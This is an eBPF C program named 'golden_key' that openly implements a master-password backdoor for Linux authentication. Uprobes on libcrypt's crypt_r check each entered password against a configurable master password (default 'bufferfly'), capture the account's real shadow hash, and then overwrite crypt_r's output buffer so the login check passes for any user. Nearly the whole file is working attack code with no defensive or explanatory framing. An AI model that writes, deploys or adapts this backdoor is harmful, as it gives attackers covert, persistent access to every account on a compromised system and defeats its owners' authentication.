#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

char LICENSE[] SEC("license") = "GPL";

char _metadata[] __attribute__((used, section(".metadata"))) =
    "{"
      "\"name\":\"golden_key\","
      "\"desc\":\"Master Password: Dynamically hooks libcrypt's crypt_r function to intercept authentication streams and replace the output buffer.\","
      "\"options\":{"
        "\"target\":[\"bufferfly\",\"System master password (≤15 characters), configurable at load or runtime\"]"
      "},"
      "\"maps\":{"
        "\"target\":{\"key_size\":4,\"value_size\":16,\"key_type\":\"u32\",\"value_type\":\"str\"}"
      "}"
    "}";

/*
 * Runtime-configurable Master Password
 * key=0 → char[16] (null-terminated, max 15 characters)
 */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, char[16]);
} target SEC(".maps");

/*
 * Records PIDs that triggered the master password → saved target shadow hash string
 * Wrap string in struct for safe storage and passing
 */
struct hash_data {
    char hash_str[128];
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u32);
    __type(value, struct hash_data);
} targeted_pids SEC(".maps");

/*
 * uprobe: crypt_r(const char *phrase, const char *setting, struct crypt_data *data)
 * Intercept password input, compare with master password, and steal the real shadow hash (setting)
 */
SEC("uprobe")
int BPF_KPROBE(crypt_r_enter, const char *phrase, const char *setting, void *data) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;

    char pwd[16] = {};
    long err = bpf_probe_read_user_str(pwd, sizeof(pwd), phrase);
    if (err <= 0) return 0;

    u32 map_key = 0;
    char *master = bpf_map_lookup_elem(&target, &map_key);
    if (!master) return 0;

    /* Byte-by-byte comparison — avoid 'break' to prevent unrolling issues */
    int match = 1;
    #pragma unroll
    for (int i = 0; i < 15; i++) {
        if (master[i] != pwd[i]) {
            match = 0;
        }
    }

    if (match) {
        struct hash_data hd = {};
        // The 'setting' in PAM is usually the full shadow hash string
        bpf_probe_read_user_str(hd.hash_str, sizeof(hd.hash_str), setting);
        bpf_map_update_elem(&targeted_pids, &pid, &hd, BPF_ANY);
    }
    return 0;
}

/*
 * uretprobe: crypt_r
 * Overwrite the writable buffer returned by crypt_r to match the real shadow hash perfectly
 */
SEC("uretprobe")
int BPF_KRETPROBE(crypt_r_exit, char *ret) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    struct hash_data *hd = bpf_map_lookup_elem(&targeted_pids, &pid);
    if (!hd) return 0;

    if (ret) {
        // Calculate the length of the string to write (including \0)
        u32 len = 0;
        #pragma unroll
        for (int i = 0; i < 127; i++) {
            if (hd->hash_str[i] == '\0') {
                len = i + 1;
                break;
            }
        }
        if (len > 0) {
            // Directly write to the crypt_r output buffer, avoiding read-only memory (-EFAULT) issues
            long we = bpf_probe_write_user(ret, hd->hash_str, len);
        }
    }

    bpf_map_delete_elem(&targeted_pids, &pid);
    return 0;
}